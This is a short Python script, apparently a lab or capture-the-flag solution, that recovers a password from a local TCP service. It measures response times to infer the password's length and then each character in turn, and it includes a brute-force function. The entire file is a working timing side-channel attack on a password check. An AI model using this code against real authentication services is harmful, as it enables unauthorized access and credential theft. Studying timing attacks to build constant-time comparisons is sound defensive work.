import socket
import sys
from itertools import product
from string import ascii_lowercase
from timeit import default_timer as timer


SAMPLES = 30
MAX_PW_LENGTH = 30

def brute_force(sock, max_pw_length):
	for i in range(1, max_pw_length+1):
		for j in product(ascii_lowercase, repeat = i):
			guess = "".join(j)
			sock.send(guess)
			response = sock.recv(64)
			if response != "Wrong password!":
				print("The password is "+ guess)
				return

# makes a pw guess and returns elapsed time
def make_guess(sock, guess):
	before = timer()
	sock.send(guess)
	response = sock.recv(64)
	after = timer()
	return after-before

# finds out the length of the password
def find_length(sock):
	average_elapsed_time = []
	for i in range(1,MAX_PW_LENGTH):
		guess = i*"*"
		time = 0
		for _ in range(SAMPLES):
			time += make_guess(sock, guess)
		#print("Length " + str(i) + ": " + str(time/SAMPLES))
		average_elapsed_time.append((i,time/SAMPLES))
	return max(average_elapsed_time, key=lambda x:x[1])[0]

def find_nth_char(sock, pw_n, pw_len):
	average_elapsed_time = []
	for c in ascii_lowercase:
		guess = pw_n + c + "*"*(pw_len - len(pw_n) - 1) # just padding to make the guess have length pw_len
		if len(pw_n) == pw_len - 1:
			sock.send(guess)
			response = sock.recv(64)
			if response != "Wrong password!":
				return c
		else:
			time = 0
			for _ in range(SAMPLES):
				time += make_guess(sock, guess)
			#print("Char " + c + ": " + str(time/SAMPLES))
			average_elapsed_time.append((c,time/SAMPLES))
	return max(average_elapsed_time, key=lambda x:x[1])[0]



def main():
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	addr = ('127.0.0.1', int(sys.argv[1]))
	sock.connect(addr)
	try:
		pw_length = find_length(sock)
		pw = ""
		for _ in range(pw_length):
			pw += find_nth_char(sock, pw, pw_length)
			print("The pw so far is: " + pw)
		print("The password is probably: "+ pw)
	
	finally:
		sock.close()


if __name__ == '__main__':
	main()